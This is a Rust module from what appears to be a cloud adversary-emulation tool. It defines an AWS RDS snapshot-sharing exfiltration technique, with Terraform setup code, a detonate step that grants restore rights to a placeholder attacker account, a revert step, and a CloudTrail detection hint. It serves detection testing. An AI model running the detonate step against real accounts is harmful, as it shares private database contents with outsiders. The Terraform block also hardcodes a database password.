use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    aws    = { source = "hashicorp/aws",    version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "aws_db_instance" "target" {
  identifier           = "stratus-red-team-rds-${random_string.suffix.result}"
  engine               = "mysql"
  engine_version       = "8.0"
  instance_class       = "db.t3.micro"
  allocated_storage    = 20
  db_name              = "stratusdb"
  username             = "admin"
  password             = "StratusRedTeam1!"
  skip_final_snapshot  = true
  publicly_accessible  = false
  deletion_protection  = false

  tags = {
    Name = "stratus-red-team-rds-${random_string.suffix.result}"
  }
}

resource "aws_db_snapshot" "target" {
  db_instance_identifier = aws_db_instance.target.id
  db_snapshot_identifier = "stratus-red-team-snapshot-${random_string.suffix.result}"
}

output "snapshot_id" {
  value = aws_db_snapshot.target.id
}
"#;

const ATTACKER_ACCOUNT_ID: &str = "012345678901";

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let snapshot_id = outputs
        .get("snapshot_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: snapshot_id"))?;

    aws.rds
        .modify_db_snapshot_attribute()
        .db_snapshot_identifier(snapshot_id)
        .attribute_name("restore")
        .values_to_add(ATTACKER_ACCOUNT_ID)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Shared RDS snapshot {} with attacker account {} via restore attribute.",
        snapshot_id, ATTACKER_ACCOUNT_ID
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let snapshot_id = outputs
        .get("snapshot_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: snapshot_id"))?;

    aws.rds
        .modify_db_snapshot_attribute()
        .db_snapshot_identifier(snapshot_id)
        .attribute_name("restore")
        .values_to_remove(ATTACKER_ACCOUNT_ID)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Removed restore permission for attacker account {} from RDS snapshot {}.",
        ATTACKER_ACCOUNT_ID, snapshot_id
    );

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.exfiltration.rds-share-snapshot",
        friendly_name: "Exfiltrate RDS Snapshot by Sharing",
        description: "Shares an RDS database snapshot with an external attacker-controlled AWS account by modifying the snapshot's restore attribute. Simulates database exfiltration via snapshot sharing.",
        detection: "CloudTrail: ModifyDBSnapshotAttribute.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Exfiltration],
        is_idempotent: false,
        is_slow: true,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
